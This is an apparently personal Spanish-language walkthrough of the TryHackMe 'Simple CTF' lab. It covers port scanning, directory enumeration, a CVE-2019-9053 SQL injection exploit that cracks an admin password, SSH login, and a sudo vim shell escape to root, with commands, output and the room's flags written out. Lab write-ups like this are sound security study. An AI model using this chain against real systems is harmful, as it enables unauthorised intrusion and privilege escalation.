https://tryhackme.com/room/easyctf
# Simple CTF

- Esta rato por que en el url aparece una cosa y como descripcion del room algo un poco diferente


### How many services are running under port 1000?
2
#### Escaneamos con nmap

```
nmap -sV -p- --min-rate 5000 -v 10.10.60.145 -oN nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-05 14:11 CDT
 
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.23 seconds
           Raw packets sent: 131089 (5.768MB) | Rcvd: 38 (3.200KB)

```
### What is running on the higher port?
ssh

### What's the CVE you're using against the application?

CVE-2019-9053

#### Buscamos directorios en el sitio web con gobuster

- Encontramos el directorio /simple

```
gobuster dir -u http://10.10.193.36/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.193.36/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/simple               (Status: 301) [Size: 313] [--> http://10.10.193.36/simple/]
Progress: 5824 / 87665 (6.64%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 5923 / 87665 (6.76%)
===============================================================
Finished
===============================================================

```

#### Identificamos el software en el directorio encontrado
- Encontramos en el sitio web> Simple cms
- La version esta abajo en la esquina inferior izquierda de la web

#### Buscamos un posible exploit
```
searchsploit simple cms 2.2.8
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
CMS Made Simple < 2.2.10 - SQL Injection                   | php/webapps/46635.py
----------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

#### Copiamos el exploit a nuestra carpeta
- de ahi sacamos el cve de la vuln

```
searchsploit -m 46635.py

  Exploit: CMS Made Simple < 2.2.10 - SQL Injection
      URL: https://www.exploit-db.com/exploits/46635
     Path: /usr/share/exploitdb/exploits/php/webapps/46635.py
    Codes: CVE-2019-9053
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kali/tmp/tryhackme/easyctf/46635.py

```

### To what kind of vulnerability is the application vulnerable?
sqli
- lo sacamos del banner anterior que aparecio al copiar el exploit
 
### What's the password?

#### Listamos las versiones de python instaladas

- se trata de verificar si tenemos la version 2 que necesitamos para correr el exploit

```
ls /usr/bin/python*

```
#### Instalamos un ambiente virtual para python 2

```
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
sudo python2 get-pip.py
pip2 install --upgrade setuptools

pip2 install virtualenv
mkdir ~/.venv2
python2 -m virtualenv ~/.venv2
source ~/.venv2/bin/activate
python --version              

Python 2.7.18

deactivate

cd tmp/tryhackme/easyctf
source ~/.venv2/bin/activate
pip install requests, termcolor

```

```
python2 46635.py -u http://10.10.31.228/simple --crack -w  /usr/share/wordlists/rockyou.txt


[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret

```

#### Where can you login with the details obtained?

ssh
 
#### What's the user flag?

#### Ingresamos por ssh  mitch:secret

```
ssh mitch@10.10.31.228 -p 2222 
 

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ ls
user.txt
$ cat user.txt
G00d j0b, keep up!

```


### Is there any other user in the home directory? What's its name?

sunbath

#### Encontramos al usuario sunbath

```
cd /home
$ ls -la
total 16
drwxr-xr-x  4 root    root    4096 aug 17  2019 .
drwxr-xr-x 23 root    root    4096 aug 19  2019 ..
drwxr-x---  3 mitch   mitch   4096 aug 19  2019 mitch
drwxr-x--- 16 sunbath sunbath 4096 aug 19  2019 sunbath

```


### What can you leverage to spawn a privileged shell?

vim
#### Migramos a otro a root, escapando de vim

```
sudo -l

User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim



```
#### Ejecutamos vim como sudo y escapamos al shell'
- la info sale de gftobins

```
>> escapar del vim

sudo vim
:!/bin/bash
exit
<Enter>
:q

o

sudo vim -c ':!/bin/sh'
<Enter>
exit
:q


exit


```

### What's the root flag?
#### Obtenemos la banera de root

```
root@Machine:/home# cd /root
root@Machine:/root# ls
root.txt
root@Machine:/root# cat root.txt

W3ll d0n3. You made it!


```






#### Conexion por ftp

```
ftp 10.10.86.171
Connected to 10.10.86.171.
220 (vsFTPd 3.0.3)
Name (10.10.86.171:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.


ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp> get ForMitch.txt
local: ForMitch.txt remote: ForMitch.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
100% |******************************************|   166      224.83 KiB/s    00:00 ETA
226 Transfer complete.
166 bytes received in 00:00 (0.89 KiB/s)
ftp> bye
221 Goodbye.


```

```
cat ForMitch.txt  
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```